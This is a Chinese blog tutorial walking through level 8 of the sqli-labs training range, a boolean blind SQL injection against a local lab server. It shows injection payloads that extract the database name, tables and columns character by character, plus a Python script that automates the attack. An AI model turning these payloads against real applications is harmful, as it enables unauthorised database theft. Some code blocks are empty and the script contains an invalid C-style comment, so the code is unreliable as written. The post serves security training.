---
layout: post
title: "sql靶场-布尔盲注第八关保姆级教程"
date: 2025-03-12 23:59:20 +0800
description: "布尔盲注了，这种页面只会有成功和错误两个状态的页面，不会出现报错显示，这种可以尝试可以通过布尔盲注来不断尝试猜测出数据：并且我们可以使用多种方法来注入。然后一个一个注入出名字的字符的ASCLL码然后对照表将名字完整的获取出来。由于表名与字段名一般不可能只有一个，所以需要多注入出它们的具体数量。发现页面变换，但是没有报错了，只有这两种页面，基本就是布尔盲注了。一般名字命名的字符是在32-128之间，所以测试一般在里面测试。手动进行布尔盲注十分麻烦，首先先要注入出名字的长度。这里发现页面变换，但是没有报错。"
keywords: "sql靶场--布尔盲注（第八关）保姆级教程"
categories: ['Sql']
tags: ['笔记', '数据库', '布尔盲注', 'Sql', 'Sql']
artid: "146218226"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146218226
    alt: "sql靶场-布尔盲注第八关保姆级教程"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146218226
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146218226
cover: https://bing.ee123.net/img/rand?artid=146218226
image: https://bing.ee123.net/img/rand?artid=146218226
img: https://bing.ee123.net/img/rand?artid=146218226
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     sql靶场--布尔盲注（第八关）保姆级教程
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <hr id="hr-toc" name="tableOfContents"/>
    <p>
    </p>
    <p>
    </p>
    <h5 id="%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%88%E7%AC%AC%E5%85%AB%E5%85%B3%EF%BC%89" name="%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%88%E7%AC%AC%E5%85%AB%E5%85%B3%EF%BC%89">
     布尔盲注（第八关）
    </h5>
    <h6 id="1.%E5%88%A4%E6%96%AD" name="1.%E5%88%A4%E6%96%AD">
     1.判断
    </h6>
    <p>
     布尔盲注了，这种页面只会有成功和错误两个状态的页面，不会出现报错显示，这种可以尝试可以通过布尔盲注来不断尝试猜测出数据：并且我们可以使用多种方法来注入
    </p>
    <p>
    </p>
    <h6 id="2.%E7%A1%AE%E8%AE%A4%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8" name="2.%E7%A1%AE%E8%AE%A4%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">
     2.确认布尔盲注
    </h6>
    <p>
     进行闭合测试
    </p>
    <p>
     单引号测试
    </p>
    <pre><code>
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="735" src="https://i-blog.csdnimg.cn/img_convert/da194e840c35ac39bdbeabb1b444f8c5.png" width="1720"/>
    </p>
    <p>
     这里发现页面变换，但是没有报错
    </p>
    <p>
    </p>
    <p>
     单引号闭合测试
    </p>
    <pre><code>
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="2-单引号闭合测试" height="735" src="https://i-blog.csdnimg.cn/img_convert/f00f17efa4dbdfe13f7d9ba8d5a31d7b.png" width="1720"/>
    </p>
    <p>
     发现这里闭合方式就是单引号
    </p>
    <p>
    </p>
    <p>
     确认是否真的没有报错
    </p>
    <p>
     使用order by 排列
    </p>
    <pre><code>
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="3-排序报错测试" height="735" src="https://i-blog.csdnimg.cn/img_convert/3edfcd09061d54acc58b41e78b4d913c.png" width="1720"/>
    </p>
    <p>
     发现页面变换，但是没有报错了，只有这两种页面，基本就是布尔盲注了
    </p>
    <p>
    </p>
    <h6 id="3.%E6%89%8B%E5%B7%A5%E5%B0%9D%E8%AF%95%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8" name="3.%E6%89%8B%E5%B7%A5%E5%B0%9D%E8%AF%95%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">
     3.手工尝试布尔盲注
    </h6>
    <p>
     手动进行布尔盲注十分麻烦，首先先要注入出名字的长度
    </p>
    <pre><code>?id=1' and (select length(database())&gt;3) --+ 
?id=1' and (select length(database())&gt;8) --+  
?id=1' and (select length(database())&gt;5) --+ 
?id=1' and (select length(database())&gt;6) --+ 
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="735" src="https://i-blog.csdnimg.cn/img_convert/12e63c195bbaa058f40b34c786677f51.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="5-数据库名长度测试2" height="735" src="https://i-blog.csdnimg.cn/img_convert/6eab30b8891cd53a51361111ececf0b5.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="6-数据库名长度测试3" height="735" src="https://i-blog.csdnimg.cn/img_convert/281196fc36b03e8ad29e90da2d162bac.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="7-数据库名长度测试4" height="735" src="https://i-blog.csdnimg.cn/img_convert/6dfc648abbfd8bf936c67c641fadb3f1.png" width="1720"/>
    </p>
    <p>
     然后一个一个注入出名字的字符的ASCLL码然后对照表将名字完整的获取出来
    </p>
    <table>
     <thead>
      <tr>
       <th>
        ‌
        <strong>
         十进制
        </strong>
        ‌
       </th>
       <th>
        ‌
        <strong>
         十六进制
        </strong>
        ‌
       </th>
       <th>
        ‌
        <strong>
         字符
        </strong>
        ‌
       </th>
       <th>
        ‌
        <strong>
         说明
        </strong>
        ‌
       </th>
       <th>
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        32
       </td>
       <td>
        0x20
       </td>
       <td>
       </td>
       <td>
        空格 (Space)
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        33-47
       </td>
       <td>
        0x21-0x2F
       </td>
       <td>
        <code>
         !
        </code>
        <code>
         "
        </code>
        <code>
         #
        </code>
        ...
        <code>
         /
        </code>
       </td>
       <td>
        标点符号
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        48-57
       </td>
       <td>
        0x30-0x39
       </td>
       <td>
        <code>
         0
        </code>
        -
        <code>
         9
        </code>
       </td>
       <td>
        阿拉伯数字
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        58-64
       </td>
       <td>
        0x3A-0x40
       </td>
       <td>
        <code>
         :
        </code>
        <code>
         ;
        </code>
        <code>
         &lt;
        </code>
        ...
        <code>
         @
        </code>
       </td>
       <td>
        特殊符号
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        65-90
       </td>
       <td>
        0x41-0x5A
       </td>
       <td>
        <code>
         A
        </code>
        -
        <code>
         Z
        </code>
       </td>
       <td>
        大写英文字母
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        91-96
       </td>
       <td>
        0x5B-0x60
       </td>
       <td>
        <code>
         [
        </code>
        <code>
         \
        </code>
        <code>
         ]
        </code>
        ... ```
       </td>
       <td>
        特殊符号
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        97-122
       </td>
       <td>
        0x61-0x7A
       </td>
       <td>
        <code>
         a
        </code>
        -
        <code>
         z
        </code>
       </td>
       <td>
        小写英文字母
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        123-126
       </td>
       <td>
        0x7B-0x7E
       </td>
       <td>
        <code>
         {
         <!-- -->
        </code>
        <code>
         |
        </code>
        <code>
         }
        </code>
        <code>
         ~
        </code>
       </td>
       <td>
        特殊符号
       </td>
       <td>
       </td>
      </tr>
     </tbody>
    </table>
    <p>
    </p>
    <h6 id="%E8%A1%A8%E5%90%8D%E5%AD%97%E7%AC%A6" name="%E8%A1%A8%E5%90%8D%E5%AD%97%E7%AC%A6">
     表名字符
    </h6>
    <p>
     一般名字命名的字符是在32-128之间，所以测试一般在里面测试
    </p>
    <p>
     可以用二分法进行测试
    </p>
    <pre><code>?id=1' and ((select ascii(substr(database(),1,1)))&gt;80) --+ 
?id=1' and ((select ascii(substr(database(),1,1)))&gt;104) --+ 
?id=1' and ((select ascii(substr(database(),1,1)))&gt;116) --+  
?id=1' and ((select ascii(substr(database(),1,1)))&gt;110) --+
?id=1' and ((select ascii(substr(database(),1,1)))&gt;113) --+
?id=1' and ((select ascii(substr(database(),1,1)))&gt;114) --+
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="735" src="https://i-blog.csdnimg.cn/img_convert/07ac97cefc0165d9d69735dd2c04b4d6.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="9-数据库名字符测试2" height="735" src="https://i-blog.csdnimg.cn/img_convert/0bbf55353c5a140780bdbf68e2147392.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="10-数据库名字符测试3" height="735" src="https://i-blog.csdnimg.cn/img_convert/fc0a7247a2de1b16cc42ad56373e6e8d.png" width="1720"/>
    </p>
    <p>
     最后确定是ASCLL是115，对照ASCLL是字符s
    </p>
    <p>
     剩下的也这样一个一个慢慢的注入出来
    </p>
    <p>
    </p>
    <h6 id="%E8%A1%A8%E6%95%B0" name="%E8%A1%A8%E6%95%B0">
     表数
    </h6>
    <p>
     注入出数据库名后再去注入表名与字段名
    </p>
    <p>
     由于表名与字段名一般不可能只有一个，所以需要多注入出它们的具体数量
    </p>
    <pre><code>?id=1' and (select count(*) from information_schema.tables where table_schema=database()) &gt; 3--+
?id=1' and (select count(*) from information_schema.tables where table_schema=database()) &gt; 5--+
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="735" src="https://i-blog.csdnimg.cn/img_convert/67c1a0c32074c679f3e5a494b4ef4bc0.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="12-表数测试2" height="723" src="https://i-blog.csdnimg.cn/img_convert/d1d7c4937354340d5296dbfe5f5fd927.png" width="1709"/>
    </p>
    <p>
    </p>
    <h6 id="%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6" name="%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6">
     表名长度
    </h6>
    <pre><code>?id=1' and (select length(table_name) FROM information_schema.tables where table_schema=database() limit 1,1)&gt;6 --+ 
?id=1' and (select length(table_name) FROM information_schema.tables where table_schema=database() limit 1,1)&gt;8 --+ 
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="735" src="https://i-blog.csdnimg.cn/img_convert/10d8d328db8d28d536742168449ca05a.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="14-表名长度测试2" height="735" src="https://i-blog.csdnimg.cn/img_convert/a2b1481285fa563e5fcae58f3bef4b6e.png" width="1720"/>
    </p>
    <p>
    </p>
    <h6 id="%E8%A1%A8%E5%AD%97%E7%AC%A6" name="%E8%A1%A8%E5%AD%97%E7%AC%A6">
     表字符
    </h6>
    <pre><code>?id=1' and (ascii(substr((select table_name FROM information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;32) --+ 
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="620" src="https://i-blog.csdnimg.cn/img_convert/56714b1a614ff48ce1719acdb43cf823.png" width="2523"/>
    </p>
    <p>
    </p>
    <h6 id="%E5%AD%97%E6%AE%B5%E6%95%B0" name="%E5%AD%97%E6%AE%B5%E6%95%B0">
     字段数
    </h6>
    <pre><code>?id=1' and (select count(*) from information_schema.columns where table_schema= 'security' and table_name='users' )&gt;2 --+ 
?id=1' and (select count(*) from information_schema.columns where table_schema= 'security' and table_name='users' )&gt;4 --+ 
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="735" src="https://i-blog.csdnimg.cn/img_convert/ff4499f7636c16f43e2a1fc93b362816.png" width="1720"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="16-字段数测试2" height="735" src="https://i-blog.csdnimg.cn/img_convert/1ac029ac790e57a68e6c12c73678851b.png" width="1720"/>
    </p>
    <p>
    </p>
    <h6 id="%E5%AD%97%E6%AE%B5%E5%90%8D%E9%95%BF%E5%BA%A6" name="%E5%AD%97%E6%AE%B5%E5%90%8D%E9%95%BF%E5%BA%A6">
     字段名长度
    </h6>
    <pre><code>?id=1' and (select length(column_name) from information_schema.columns where table_schema= 'security' and table_name='users' limit 1,1)&gt;6 --+ 
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="735" src="https://i-blog.csdnimg.cn/img_convert/d3f31e1e481ce30f95c638bac2b9b87c.png" width="1720"/>
    </p>
    <p>
    </p>
    <h6 id="%E5%AD%97%E6%AE%B5%E5%AD%97%E7%AC%A6" name="%E5%AD%97%E6%AE%B5%E5%AD%97%E7%AC%A6">
     字段字符
    </h6>
    <pre><code>?id=1' and (ascii(substr((select column_name from information_schema.columns where table_schema= 'security' and table_name='users' limit 0,1),1,1))&gt;32) --+ 
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="620" src="https://i-blog.csdnimg.cn/img_convert/a83d9acda1eb5c6d1508c6fbec715496.png" width="2523"/>
    </p>
    <p>
     所以这种方式十分费时费力，建议写python的脚本进行注入
    </p>
    <p>
    </p>
    <h6 id="4.%E8%84%9A%E6%9C%AC%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5" name="4.%E8%84%9A%E6%9C%AC%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5">
     4.脚本布尔盲注注入
    </h6>
    <pre><code>import requests #用于发送HTTP请求
 
url = "http://127.0.0.1/sqli-labs/Less-8/"
 
def inject_database(url):
    name = ''
 	# 初始化空字符串，存储最终数据库名
    for i in range(1, 100):
    # 遍历字符位置（假设数据库名最长99字符）
        low = 32
        # ASCII可打印字符起始值（空格）
        high = 128
        # ASCII结束值（DEL字符，实际只用到127）
        mid = (low + high) // 2
         # 二分法初始中间值
        while low &lt; high:
        # 二分查找当前字符的ASCII值
            payload = " 1' and ascii( substr( (select database()),%d,1)) &gt; %d--  " % (i, mid)
            /**
            " "  里面是构造的Payload
            1'   闭合前面的单引号
            ascii() 将字符转换为相应的ACSII值
            substr( (),%d,1) 获取()里面的字符集的第 %d 位开始的第一位字符,第一个%d(占位符)是代表i
            select( database()) 查询获取当前的数据库名
            ()&gt;%d  第二个也就是这个%d是mid
            and ('1')=('1  闭合
            % (i, mid) 为 Python 的字符串格式化语法，将变量 i（字符位置）和 mid（猜测的 ASCII 值）动态插入 Payload，实现自动化枚
            */
            params = {"id": payload}
            r = requests.get(url, params=params)
            if "You are in..........." in r.text:
            #if() 看页面里面有没有You are in...........来判断字符的ASCII值是否大于mid 
                low = mid + 1
                # 当前字符ASCII值 &gt; mid，调整下限
            else:
                high = mid
            mid = (low + high) // 2
 
        if mid == 32:
        # 若mid为32（空格），终止循环
            break
        name = name + chr(mid)
        # 将ASCII转为字符并拼接
        print(name)
        # 实时输出当前结果
        
inject_database(url)
# 执行注入函数
</code></pre>
    <p>
    </p>
    <h5 id="" name="">
    </h5>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f6d305f37353136373832342f:61727469636c652f64657461696c732f313436323138323236" class_="artid" style="display:none">
 </p>
</div>


